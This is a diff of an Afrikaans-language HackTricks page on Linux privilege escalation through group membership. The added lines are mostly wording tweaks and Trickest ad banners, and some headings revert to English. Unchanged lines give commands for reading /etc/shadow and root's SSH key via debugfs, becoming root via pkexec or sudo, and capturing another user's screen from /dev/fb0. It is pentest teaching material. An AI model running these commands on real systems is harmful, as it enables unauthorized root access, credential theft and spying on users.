@@ -1,18 +1,24 @@
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Support HackTricks</summary>
+<summary>Ondersteun HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
+* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
+Kry Toegang Vandag:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 # Sudo/Admin Groepe
 
@@ -38,12 +44,12 @@ Vind alle suid binaire en kyk of daar die binaire **Pkexec** is:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-As jy vind dat die binêre pkexec 'n SUID-binêre is en jy behoort tot sudo of admin, kan jy waarskynlik binêre uitvoer as sudo met behulp van pkexec.  
+As jy vind dat die binêre pkexec 'n SUID-binêre is en jy behoort tot sudo of admin, kan jy waarskynlik binêre uitvoer as sudo met behulp van pkexec. 
 Kontroleer die inhoud van:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **per standaard** kan sommige van die groepe **sudo of admin** **verskyn**.
+Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **per standaard** kan sommige van die groepe **sudo of admin** in linux **verskyn**.
 
 Om **root te word kan jy uitvoer**:
 ```bash
@@ -72,7 +78,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 {% endcode %}
 
-# Wielgroep
+# Wheel Group
 
 **Soms**, **per standaard** binne die **/etc/sudoers** lêer kan jy hierdie lyn vind:
 ```text
@@ -84,9 +90,9 @@ As dit die geval is, om **root te word kan jy net uitvoer**:
 ```text
 sudo su
 ```
-# Shadow Groep
+# Shadow Group
 
-Gebruikers van die **groep shadow** kan **lees** die **/etc/shadow** lêer:
+Users from the **group shadow** can **read** the **/etc/shadow** file:
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
@@ -104,7 +110,7 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Let wel dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy doen:
+Let daarop dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy doen:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
@@ -119,9 +125,9 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-Die **tty1** beteken dat die gebruiker **yossi fisies ingelog is** op 'n terminal op die masjien.
+Die **tty1** beteken dat die gebruiker **yossi fisies ingelogde** is op 'n terminal op die masjien.
 
-Die **video-groep** het toegang om die skermuitset te sien. Basies kan jy die skerms observeer. Om dit te doen, moet jy die **huidige beeld op die skerm** in rou data gryp en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm op `/sys/class/graphics/fb0/virtual_size` vind.
+Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms observeer. Om dit te doen, moet jy die **huidige beeld op die skerm** in rou data gryp en die resolusie wat die skerm gebruik, kry. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm op `/sys/class/graphics/fb0/virtual_size` vind.
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -136,7 +142,7 @@ Verander dan die Breedte en Hoogte na diegene wat op die skerm gebruik word en k
 
 # Root Groep
 
-Dit lyk of **lede van die root groep** standaard toegang kan hê om **te wysig** sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog...
+Dit lyk of **lede van die root groep** standaard toegang kan hê om sommige **diens** konfigurasielêers of sommige **biblioteek** lêers of **ander interessante dinge** wat gebruik kan word om voorregte te verhoog, te **wysig**...
 
 **Kontroleer watter lêers root lede kan wysig**:
 ```bash
@@ -144,7 +150,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 # Docker Groep
 
-Jy kan die wortel lêersisteem van die gasheer masjien aan 'n instansie se volume monteer, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.
+Jy kan die wortel lêer stelsel van die gasheer masjien aan 'n instansie se volume monteer, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief wortel op die masjien.
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
@@ -153,6 +159,14 @@ Jy kan die wortel lêersisteem van die gasheer masjien aan 'n instansie se volum
 # lxc/lxd Groep
 
 [lxc - Privilege Escalation](lxd-privilege-escalation.md)
+
+
+<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
+Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) om maklik te bou en **werkvloei** te **automate** wat deur die wêreld se **mees gevorderde** gemeenskap gereedskap aangedryf word.\
+Kry Vandag Toegang:
+
+{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
 Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
